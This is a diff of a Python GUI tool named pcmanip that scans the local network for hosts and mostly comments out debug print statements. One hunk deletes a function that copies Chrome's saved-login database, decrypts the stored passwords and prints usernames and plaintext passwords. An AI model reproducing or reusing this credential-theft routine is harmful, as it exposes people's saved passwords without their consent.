@@ -56,15 +56,15 @@ class Argv:
 				self.data.append([d])
 			else:
 				self.data.append(d)
-		print(self.data)
+		# print(self.data)
 	def __getitem__(self, item):
 		if type(item) is int:
 			return self.data[item]
 		elif type(item) is str:
-			print("\n")
-			print(1, item)
+			# print("\n")
+			# print(1, item)
 			for arg, *par in self.data:
-				print(2, arg, par)
+				# print(2, arg, par)
 				if item == arg:
 					if par!=[False]:
 						return par
@@ -111,7 +111,7 @@ def check_ip_gui(host):
 		name = socket.gethostbyaddr(host)
 		hosts.append([host, *name])
 		#print(socket.getsockname(host))
-		print(name)
+		# print(name)
 		computer_listbox.insert(tkinter.END, name[0])
 	except socket.herror:
 		pass
@@ -123,7 +123,7 @@ def scan_computers_gui():
 	mask = get_subnet_mask()
 	cidr = get_cidr(mask)
 
-	print(local_ip, public_ip, mask, cidr)
+	# print(local_ip, public_ip, mask, cidr)
 
 	interface = ipaddress.ip_interface(public_ip+"/"+str(cidr))
 
@@ -149,7 +149,7 @@ def update_info(event):
 	if len(computer_listbox.curselection()) > 0:
 		a = computer_listbox.curselection()[-1]
 		h = computer_listbox.get(a)
-		print(h)
+		# print(h)
 		host = []
 		for i in hosts:
 			if i[1] == h:
@@ -247,34 +247,6 @@ def update_text_about_computer():
 	# add_text_computer_info(f"")
 	# add_text_computer_info(f"")
 
-def fetch_chrome_passwords():
-	key = fetching_ek() 
-	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data") 
-	filename = "Chromepwds.db"
-	shutil.copyfile(db_path, filename) 
-	
-	db = sqlite3.connect(filename) 
-	cur = db.cursor() 
-
-	cur.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used") 
-	for i in cur.fetchall(): 
-		main_url, login_page_url, username, decrypted_pwd, date_of_creation, last_usuage = i[0], i[1], i[2], pwd_decrypt(i[3], key), i[4], i[5]
-		if username or decrypted_pwd: 
-			print(main_url, login_page_url, username, decrypted_pwd, chrome_date_and_time(date_of_creation), chrome_date_and_time(last_usuage), sep="\n") # <===================================================================== 		
-		else: 
-			continue
-		# if date_of_creation != 86400000000 and date_of_creation:
-		# 	print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
-		
-		# if last_usuage != 86400000000 and last_usuage:
-		# 	print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-	cur.close() 
-	db.close() 
-	try: 
-		os.remove(filename) 
-	except: 
-		pass
-
 def parse_argv(argv):
 	print(argv)
 	if not argv: return Argv(argv)
@@ -286,14 +258,14 @@ def parse_argv(argv):
 	i = 0
 	argv = new_argv.copy()
 	new_argv.clear()
-	print(argv)
+	# print(argv)
 	while i < len(argv):
 		# print(i)
 		arg = argv[i]
 		# print(arg, i)
 		new_arg = [arg, {}]
 		i+=1
-		print(arg)
+		# print(arg)
 		if arg[0] == '-':
 			# print(4, arg)
 			for j, param in enumerate(param_syntax[arg]["params"]):
@@ -321,7 +293,7 @@ def parse_argv(argv):
 		new_argv.append(new_arg)
 	argv = new_argv.copy()
 	new_argv.clear()
-	print(argv)
+	# print(argv)
 	return Argv(argv)
 
 def choose_and_set_wallpaper():
@@ -344,7 +316,7 @@ def show_version_warning():
 	if not new_ver: new_ver = "?"
 	else: new_ver = "v"+".".join(map(str, new_ver))
 
-	print(f"Current version: {cur_ver}\nNewest version: {new_ver}")
+	# print(f"Current version: {cur_ver}\nNewest version: {new_ver}")
 
 	messagebox.showwarning(title="Version outdated",
 				message=f"This version of pcmanip is outdated!\nCurrent version: {cur_ver}\nNewest version: {new_ver}\nDownload new version from github.com/grinheckerdev/pcmanip")
@@ -356,8 +328,6 @@ def main_gui(argv):
 	if version_outdated:
 		x = threading.Thread(target = show_version_warning)
 		x.start()
-	else:
-		print("NEWEST VERSION!")
 
 	root = tkinter.Tk()
 	root.title("PCmanip")
